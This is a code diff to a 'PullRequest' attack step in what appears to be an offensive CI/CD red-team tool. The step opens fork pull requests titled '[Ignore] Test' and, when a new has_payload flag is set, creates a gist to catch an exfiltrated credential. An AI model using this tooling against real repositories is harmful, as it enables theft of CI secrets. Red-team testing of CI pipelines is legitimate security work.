@@ -25,6 +25,7 @@ class PullRequest(AttackStep):
         modified_files=[],
         pr_title="[Ignore] Test",
         timeout=60,
+        has_payload=False,
     ):
         """
         Initializes the PullRequest attack step.
@@ -51,6 +52,7 @@ class PullRequest(AttackStep):
         self.exfil_credential = exfil_credential
         self.pr_title = pr_title
         self.timeout = timeout
+        self.has_payload = has_payload
 
     def setup(self, api):
         """
@@ -121,19 +123,21 @@ class PullRequest(AttackStep):
             Output.error("Failed to check for target branch!")
             return False
 
-        catcher_gist, gist_id = AttackUtilities.create_exfil_gist(
-            api, self.exfil_credential
-        )
+        if self.has_payload:
 
-        self.output["catcher_gist"] = catcher_gist
-        self.output["exfil_gist"] = gist_id
+            catcher_gist, gist_id = AttackUtilities.create_exfil_gist(
+                api, self.exfil_credential
+            )
 
-        Output.info("Enter 'Confirm' when ready to continue.")
+            self.output["catcher_gist"] = catcher_gist
+            self.output["exfil_gist"] = gist_id
 
-        user_input = input()
-        if user_input.lower() != "confirm":
-            Output.warn("Exiting attack!")
-            return False
+            Output.info("Enter 'Confirm' when ready to continue.")
+
+            user_input = input()
+            if user_input.lower() != "confirm":
+                Output.warn("Exiting attack!")
+                return False
 
         return True
 
@@ -200,6 +204,7 @@ class PullRequest(AttackStep):
             Output.info(
                 f"Fork pull request created successfully, you can view it at {result}!"
             )
+            self.output["pr_number"] = result.split("/")[-1]
         else:
             Output.error("Failed to create fork pull request!")
             return False
@@ -227,14 +232,3 @@ class PullRequest(AttackStep):
             self.output["status"] = "FAILURE"
 
         return True
-
-    def handoff(self):
-        """
-        Handles any necessary post-execution operations.
-
-        This method can be used to pass data or results to subsequent steps in the attack workflow.
-
-        Returns:
-            Any: Depends on the superclass implementation.
-        """
-        return super().handoff()
